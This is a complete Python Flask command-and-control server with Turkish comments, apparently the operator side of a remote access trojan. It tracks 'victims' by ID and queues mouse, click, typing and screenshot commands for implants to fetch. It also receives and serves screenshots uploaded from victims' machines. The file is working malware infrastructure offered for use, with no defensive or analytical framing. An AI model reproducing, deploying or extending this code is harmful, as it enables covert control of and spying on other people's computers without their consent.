# control_server.py (ngrok ile veya VPS'te çalıştır)
from flask import Flask, request, send_file, jsonify
import os

app = Flask(__name__)
commands = {}  # victim_id: komut
screenshots = {}  # victim_id: dosya yolu

@app.route('/control')
def control():
    vid = request.args.get('id', 'bilinmiyor')
    cmd = commands.get(vid, 'Yok')
    return f"""
    <html>
    <head><title>VVayne Remote</title><style>body{{background:#111;color:#0f0;font-family:monospace;}}</style></head>
    <body>
    <h1>Kurban ID: {vid}</h1>
    <p>Mevcut komut: {cmd}</p>
    <form action="/set">
        <input type="hidden" name="id" value="{vid}">
        <input type="text" name="cmd" placeholder="mouse_move 500 300 / click / type Merhaba / screenshot" style="width:400px;padding:8px;">
        <button type="submit">Gönder</button>
    </form>
    <br>
    <a href="/screen/{vid}">Son ekran görüntüsünü indir</a>
    </body>
    </html>
    """

@app.route('/set')
def set_cmd():
    vid = request.args.get('id')
    cmd = request.args.get('cmd')
    if vid and cmd:
        commands[vid] = cmd
    return f"Komut gönderildi! <a href='/control?id={vid}'>Geri</a>"

@app.route('/remote')
def get_cmd():
    vid = request.args.get('id')
    return commands.get(vid, 'none')

@app.route('/clear')
def clear():
    vid = request.args.get('id')
    if vid in commands:
        del commands[vid]
    return 'OK'

@app.route('/upload', methods=['POST'])
def upload():
    vid = request.args.get('id')
    if 'file' in request.files:
        f = request.files['file']
        path = f'static/{vid}_screen.png'
        f.save(path)
        screenshots[vid] = path
        return 'OK'
    return 'NO'

@app.route('/screen/<vid>')
def get_screen(vid):
    path = screenshots.get(vid)
    if path and os.path.exists(path):
        return send_file(path, mimetype='image/png')
    return 'Görüntü yok'

if __name__ == '__main__':
    os.makedirs('static', exist_ok=True)
    app.run(host='0.0.0.0', port=5000)
